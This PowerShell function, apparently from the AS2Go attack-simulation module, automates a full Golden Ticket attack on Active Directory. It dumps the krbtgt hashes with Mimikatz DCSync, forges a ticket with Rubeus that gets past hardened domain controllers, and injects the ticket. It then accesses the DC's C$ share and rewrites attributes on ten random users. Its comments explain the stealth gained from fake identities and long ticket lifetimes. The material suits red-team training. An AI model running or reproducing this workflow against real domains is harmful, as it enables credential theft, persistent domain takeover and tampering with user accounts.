<#
.SYNOPSIS
Demonstrates Golden Ticket creation and its use against a selected domain.

.DESCRIPTION
Prompts for a domain and a built-in Administrator or a generated fake identity.
Offers a Mimikatz DCSync request for the domain krbtgt hashes and saves retrieved hashes.
On confirmation, forges a Golden Ticket with Rubeus golden using the domain SID and the krbtgt key.
Rubeus includes the PAC_REQUESTOR structure and domain-policy lifetimes, which hardened Domain
Controllers require since the November 2022 Kerberos patching; Mimikatz-forged tickets without this
structure are rejected with KDC_ERR_TGT_REVOKED. The forged ticket is validated against the Domain
Controller with Import-KirbiFile before injection.
Displays cached tickets, attempts access to the DC C$ share, and changes the info attribute of up to
ten domain users.

.EXAMPLE
Invoke-GoldenTicketAttack
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Mimikatz and Rubeus, initialized AS2Go domain settings, and the rights needed for the
selected operations. Works against Domain Controllers hardened by KB5008380/KB5020805.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Demonstrates how a compromised krbtgt hash can be used to forge a PAC_REQUESTOR-compliant Golden Ticket with Rubeus.
Offers DCSync hash retrieval, selects a ticket identity, and validates the forged ticket against the hardened KDC before injection.
Inspects cached tickets after injection and tests DC administrative-share access.
#>
Function Invoke-GoldenTicketAttack {

    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP12_GT.html"
    If (-not $SkipClearHost) { Clear-Host }
    Write-AS2GoOutput -Type Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    Write-AS2GoOutput -Type Bullet -M "Dump the AES-256 and NTLM Hash for the 'krbtgt' Account "
    Write-AS2GoOutput -Type Bullet -M "Forge a Golden Ticket compliant with hardened Domain Controllers"
    Write-AS2GoOutput -Type Bullet -M "Use the Golden Ticket to Achieve Unrestricted Kerberos dominance"

    If ($UnAttended) {
        $answer = $Script:Yes
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -ne $Script:Yes) {
        return
    }

    $sPrefix = Get-Date -Format HHmmss
    $sSuffix = Get-Date -Format yyyyMMdd
    $ShadowUser = "FU-$sSuffix.$sPrefix"
    
    Write-AS2GoOutput -Type H1 -Message "`nSelect a (fake) account for the Golden Ticket attack"
    Write-AS2GoOutput -Type Bullet -Message "A fake user improves stealth because it is not tied to a known, monitored admin account, making attribution and unusual account activity harder to detect."
    Write-AS2GoOutput -Type Bullet -Message "It also avoids password-reset effects and enables long-lived TGTs, since ticket validity can be set independently of normal password and ticket policies."

    $title = "Select a (fake) account for the Golden Ticket attack."
    $message = "Enter your choice!"
    $Options = @(
        [pscustomobject] @{ Label = "&User Account"; Help = "Select an existing AD user account from domain/forest"; Value = "Real" },
        [pscustomobject] @{ Label = "&Built-in Administrator"; Help = "Account with the RID -500"; Value = "RID500" },
        [pscustomobject] @{ Label = "&Fake User"; Help = "Random Fake User account, $ShadowUser"; Value = "Fake" }
    )
    $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title

    If ($answer -eq "Fake") {
        $dn = Select-ADObject -DomainSelectionOnly -Title "Select a domain for the Golden Ticket demonstration"
        If (-not $dn) {
            Write-AS2GoOutput -Type Info -Message "No domain selected for the Golden Ticket demonstration."
            return
        }
        $cn = Convert-FromDNToCN -DistinguishedName $dn
        $id = 6543210
        Write-AS2GoOutput -Type Textmaker -message "Selected Domain" -TM $cn
    }
    elseif ($answer -eq "RID500") {
        $dn = Select-ADObject -Title "Select a domain for the Golden Ticket demonstration" -DomainSelectionOnly
        If (-not $dn) {
            Write-AS2GoOutput -Type Info -Message "No domain selected for the Golden Ticket demonstration."
            return
        }
        $cn = Convert-FromDNToCN -DistinguishedName $dn
        $server = Get-BestDomainController -domain $dn
        $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match "^$dn" } | Select-Object DomainFQDN, DomainSID, NetBIOSName, IsRootDomain
        $tempSID = $temp.DomainSID + "-500"
        
        $realUser = Get-ADUser -Server $server -identity $tempSID
        $RID500CN = Convert-FromDNToCN -DistinguishedName $realUser.DistinguishedName

        $ShadowUser = $realUser.SamAccountName
        $id = 500
        Write-AS2GoOutput -Type Textmaker -message "Selected Account" -TM "$($RID500CN)"
    }
    else {
        $dn = Select-ADObject -Title "Select an user for the Golden Ticket demonstration" -IncludeUsers -MarkTier0 -BlockOUSelection
        If (-not $dn) {
            Write-AS2GoOutput -Type Info -Message "No user selected for the Golden Ticket demonstration."
            return
        }
        $cn = Convert-FromDNToCN -DistinguishedName $dn
        $server = Get-BestDomainController -domain $dn
        $realUser = Get-ADUser -Server $server -identity $dn
        $ShadowUser = $realUser.SamAccountName
        $id = $($realUser.Sid.Value).Split("-")[-1]
        $dn = if ($dn -match '(?i)(^|,)(DC=[^,]+(?:,DC=[^,]+)*)$') { $Matches[2] } else { $null }
        Write-AS2GoOutput -Type Textmaker -message "Selected Account - " -TM $cn
    }    

    $server = Get-BestDomainController -domain $dn
    $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match "^$dn" } | Select-Object DomainFQDN, DomainSID, NetBIOSName, IsRootDomain 
    
    $Script:ASDomainSID = $temp.DomainSID
    $Script:ASFQDN = $temp.DomainFQDN
    

    $KrbtgtName = "krbtgt"
    $KrbtgtSID = $Script:ASDomainSID + "-502"
    $KrbtgtAccount = $temp.NetBIOSName + "\" + $KrbtgtName
 

    Set-ASConfig -Setting "LastGTUser" -Value $ShadowUser


    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type  Header -M " Step 1 of 3 | Dump the AES-256 and NTLM Hash for the 'krbtgt' account"
    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
      
        
    Write-Highlight -Text ".\mimikatz.exe ", """lsadump::", "dcsync", " /domain:", $Script:ASFQDN, " /user:", $KrbtgtAccount, """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS

    $answer = show-decisionPrompt

    $Script:ASKrbtgtNtml = $null
    $Script:ASKrbtgtAes256 = $null

    If ($answer -eq $Script:Yes) {
        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$ShadowUser.log" "lsadump::dcsync /domain:$Script:ASFQDN /dc:$server /user:$KrbtgtSID"  "exit" }

        [string]$result = Get-Content -Path "$Script:DefautExfiltrationFolder\$ShadowUser.log" | Select-String 'aes256_hmac'
        If (-not [string]::IsNullOrEmpty($result)) {
            $Script:ASKrbtgtAes256 = $result.Split(":")[-1].Trim()
        }

        [string]$result = Get-Content -Path "$Script:DefautExfiltrationFolder\$ShadowUser.log" | Select-String 'Hash NTLM:'
        If (-not [string]::IsNullOrEmpty($result)) {
            $Script:ASKrbtgtNtml = $result.Replace(" ", "").Split(":")[-1]
        }

        If ($Script:ASKrbtgtAes256) {
            Write-AS2GoOutput -Type Success -Message "Identified AES-256 Hash $($Script:ASKrbtgtAes256) for $KrbtgtAccount account" -NoExtraLines
        }
        If ($Script:ASKrbtgtNtml) {
            Write-AS2GoOutput -Type Success -Message "Identified NTLM Hash $($Script:ASKrbtgtNtml) for $KrbtgtAccount account" -NoExtraLines
        }
        If (-not ($Script:ASKrbtgtAes256 -or $Script:ASKrbtgtNtml)) {
            Write-AS2GoOutput -type Error -Message "Failed receiving AES-256 and NTLM hashes for $KrbtgtAccount account" -NoExtraLines
        }
        
        if ($UnAttended) { Start-Sleep 2 } else { Pause }
    }

    If (-not ($Script:ASKrbtgtAes256 -or $Script:ASKrbtgtNtml)) {
        Write-AS2GoOutput -Type Warning -Message "No krbtgt hash available. The Golden Ticket forge needs a valid hash; run the DCSync step again." -NoExtraLines
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    If ($temp.IsRootDomain -eq $true) {
        $groups = "512,513,518,519"
    }
    else {
        $groups = "512,513,519"
    }

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type  Header -M "Step 2 of 3 | Forge a Golden Ticket with Rubeus"

    $Rubeus = Join-Path -Path $Script:ASTools -ChildPath "Rubeus.exe"
    $forgeTicketFile = "$Script:AS2GoTicketsDir\GT.kirbi"

    $forgeHash = $Script:ASKrbtgtAes256
    $forgeHashType = "/aes256:"
    If (-not $forgeHash) {
        $forgeHash = $Script:ASKrbtgtNtml
        $forgeHashType = "/rc4:"
    }

    Write-AS2GoOutput -Type Info -Message "Rubeus forges the Golden Ticket with the PAC_REQUESTOR structure and domain-policy ticket lifetimes.`n      Hardened Domain Controllers (KB5008380/KB5020805) reject Mimikatz-forged tickets without this structure (KDC_ERR_TGT_REVOKED)."

    Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
    Write-Highlight -Text ".\Rubeus.exe ", "golden", " /user:", $ShadowUser, " /id:", $id, " /sid:", $Script:ASDomainSID, " /newpac $forgeHashType", $forgeHash, " /domain:", $Script:ASFQDN, " /startoffset:-10 ", " /outfile:", $forgeTicketFile `
        -Color $fgcC, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS

    $answer = Show-DecisionPrompt
    
        
    If ($answer -eq $Script:Yes) {

        $i = 7
        If (-not $UnAttended) {
            $lifetimeOptions = @(
                [pscustomobject] @{ Label = "&Use 7 days"; Help = "Use the default Golden Ticket lifetime"; Value = 7 },
                [pscustomobject] @{ Label = "&Custom lifetime"; Help = "Enter a custom lifetime between 8 and 365 days"; Value = "Custom" }
            )
            $selectedLifetime = Show-DecisionPrompt -Title "Select the Golden Ticket lifetime" -Message "Choose the ticket validity period." -Options $lifetimeOptions -Default 0

            If ($selectedLifetime -eq "Custom") {
                While ($true) {
                    $customLifetime = Read-Host "`n  Please enter a value between 8 and 365"
                    If ($customLifetime -match '^\d+$') {
                        $customLifetime = [int]$customLifetime
                        If ($customLifetime -ge 8 -and $customLifetime -le 365) {
                            $i = $customLifetime
                            break
                        }
                    }
                    Write-AS2GoOutput -Type Warning -Message "Invalid input. Only whole numbers between 8 and 365 are allowed."
                }
            }
        }

        Remove-Item $forgeTicketFile -ErrorAction SilentlyContinue

        $goldenArgs = @(
            "golden",
            "/user:$ShadowUser",
            "/id:$id",
            "/sid:$Script:ASDomainSID",
            "/newpac",
            "$forgeHashType$forgeHash",
            "/domain:$Script:ASFQDN",
            "/startoffset:-10",
            "/endtime:$i`d",
            "/outfile:$forgeTicketFile"
        )

        & $Rubeus @goldenArgs 2>&1 | Out-Host
        $forgeTicketFile = get-childitem $Script:AS2GoTicketsDir | sort-object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty Fullname  
        If (-not (Test-Path -Path $forgeTicketFile)) {
            Write-AS2GoOutput -type Error -Message "Failed to forge a Golden ticket for '$ShadowUser'. No ticket file was created."
            Measure-FunctionRuntime -End -Details $Info
            return
        }

        Write-AS2GoOutput -type Success -Message "Golden ticket for '$ShadowUser' forged and saved to '$forgeTicketFile'."
        set-ASConfig -Setting "ASP07KR" -Value "$($Script:ASFQDN)|$($ShadowUser)|$($id)|$($Script:ASKrbtgtNtml)|$($groups)|$($Script:ASDomainSID)" -DPAPI

        
        if (-not $unattended) { Pause }
        If (-not $SkipClearHost) { Clear-Host }
         
        Write-AS2GoOutput -type Header -message "Validate and inject the Golden Ticket"
        Set-NewColorSchema -NewStage $Script:GoldenTicket
        $validated = Import-KirbiFile -TicketFile $forgeTicketFile -Service "cifs/$server" -DomainController $server

        If (-not $validated) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }

        If (-not $SkipClearHost) { Clear-Host }
        
        Write-AS2GoOutput -type Header -message "Step 3 of 3 | Test the Golden Ticket"
        #"Make some changes to the Domain to verify the Golden Ticket attack was successful"


        Test-AccessToOneDCPerDomain
        
        $passed = Test-AccessDirectory -directory "\\$server\c$\*.*"
        
        
        
        If ($passed) {
            Write-AS2GoOutput -Type Success -Message "Successfully accessed directory '\\$server\c$\*.*'."
        }
        else {
            Write-AS2GoOutput -Type Error -Message "Failed to access directory '\\$server\c$\*.*'."
        }

        $users = Get-ADUser -Filter * -SearchBase $dn -Server $server |
        Get-Random -Count 10

        foreach ($user in $users) {
            Set-ADUser -Identity $user.DistinguishedName `
                -Server $server `
                -Replace @{ info = "Golden Ticket Attack - $ShadowUser was here" }
        }

        Get-ADUser -Filter * -SearchBase $dn -Server $server -Properties info, whenChanged, DisplayName |
        Where-Object { $_.DistinguishedName -in $users.DistinguishedName } |
        Select-Object sAMAccountName, DisplayName, whenChanged, info |
        Format-Table -AutoSize


        Pause
    }


    Measure-FunctionRuntime -End -Details $Info
}
